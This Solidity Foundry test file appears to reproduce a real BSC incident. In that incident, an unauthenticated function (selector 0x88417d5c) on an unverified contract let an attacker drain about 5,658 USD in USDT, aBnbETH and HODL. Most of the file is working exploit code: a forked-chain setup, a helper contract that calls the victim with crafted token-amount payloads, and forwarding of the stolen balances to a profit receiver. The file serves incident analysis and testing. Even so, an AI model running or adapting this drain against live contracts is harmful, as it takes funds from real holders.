// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 5,658.46 USD
// Attacker : 0x1491B276528531AD3F41DbE9B00387ABaC55c114
// Attack Contract : 0x167d4A1658DD960B2945131Cd90ca4fdf0FAa242
// Vulnerable Contract : 0x000004A70f92f1b22de1201aF76C48365d5D0000
// Attack Tx : https://bscscan.com/tx/0x7ca804d016be67c570a10a620b9ae3027fd6b03d0965da3ec78912be067af024
//
// @Info
// Vulnerable Contract Code : unverified
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1184
//
// Attack summary: The attacker called an unauthenticated function on the unverified victim contract
// to transfer the victim's token balances to an attack helper, then forwarded the received assets.
// Root cause: selector 0x88417d5c accepts token/amount payloads and transfers victim-held tokens
// to msg.sender without effective caller authorization.

address constant VULNERABLE = 0x000004A70f92f1B22de1201aF76C48365D5D0000;
address constant DRAIN_USDT = 0x55d398326f99059fF775485246999027B3197955;
address constant DRAIN_ABNB_ETH = 0x2E94171493fAbE316b6205f1585779C887771E2F;
address constant DRAIN_HODL = 0x32B407ee915432Be6D3F168bc1EfF2a6F8b2034C;
bytes4 constant VICTIM_DRAIN_SELECTOR = 0x88417d5c;

struct TokenAmount {
    address token;
    uint256 amount;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        uint256 forkBlock = 50_311_055;
        vm.createSelectFork("bsc", forkBlock);

        profitReceiver = makeAddr("profitReceiver");
        attacker = profitReceiver;
        multiAssetLog = true;
        _addFundingToken(DRAIN_USDT);
        _addFundingToken(DRAIN_ABNB_ETH);

        vm.label(VULNERABLE, "Unverified Victim");
        vm.label(DRAIN_USDT, "USDT");
        vm.label(DRAIN_ABNB_ETH, "aBnbETH");
        vm.label(DRAIN_HODL, "HODL");
    }

    function testExploit() public balanceLog {
        uint256 victimUsdtBefore = IERC20(DRAIN_USDT).balanceOf(VULNERABLE);
        uint256 victimABnbEthBefore = IERC20(DRAIN_ABNB_ETH).balanceOf(VULNERABLE);
        uint256 victimHodlBefore = IERC20(DRAIN_HODL).balanceOf(VULNERABLE);

        uint256 attackerUsdtBefore = IERC20(DRAIN_USDT).balanceOf(profitReceiver);
        uint256 attackerABnbEthBefore = IERC20(DRAIN_ABNB_ETH).balanceOf(profitReceiver);
        uint256 attackerHodlBefore = IERC20(DRAIN_HODL).balanceOf(profitReceiver);

        // step 1: deploy a local helper and drain the victim-held token balances.
        Unverified0000DrainAttack attack = new Unverified0000DrainAttack(profitReceiver);
        attack.execute();

        // step 2: assert the victim balances were drained and attacker balances increased.
        assertEq(IERC20(DRAIN_USDT).balanceOf(VULNERABLE), 0);
        assertEq(IERC20(DRAIN_ABNB_ETH).balanceOf(VULNERABLE), 0);
        assertEq(IERC20(DRAIN_HODL).balanceOf(VULNERABLE), 0);

        assertEq(IERC20(DRAIN_USDT).balanceOf(profitReceiver) - attackerUsdtBefore, victimUsdtBefore);
        assertEq(IERC20(DRAIN_ABNB_ETH).balanceOf(profitReceiver) - attackerABnbEthBefore, victimABnbEthBefore);
        assertGt(IERC20(DRAIN_HODL).balanceOf(profitReceiver) - attackerHodlBefore, (victimHodlBefore * 9) / 10);
    }
}

contract Unverified0000DrainAttack {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function execute() external {
        _drainAndForward(DRAIN_USDT);
        _drainAndForward(DRAIN_ABNB_ETH);
        _drainAndForward(DRAIN_HODL);
    }

    function _drainAndForward(
        address token
    ) private {
        uint256 amount = IERC20(token).balanceOf(VULNERABLE);
        TokenAmount[] memory entries = new TokenAmount[](1);
        entries[0] = TokenAmount({token: token, amount: amount});

        (bool ok,) =
            VULNERABLE.call(abi.encodeWithSelector(VICTIM_DRAIN_SELECTOR, uint256(0), uint256(0), uint256(0), entries));
        require(ok, "victim drain call failed");

        require(IERC20(token).transfer(profitReceiver, IERC20(token).balanceOf(address(this))), "forward failed");
    }
}
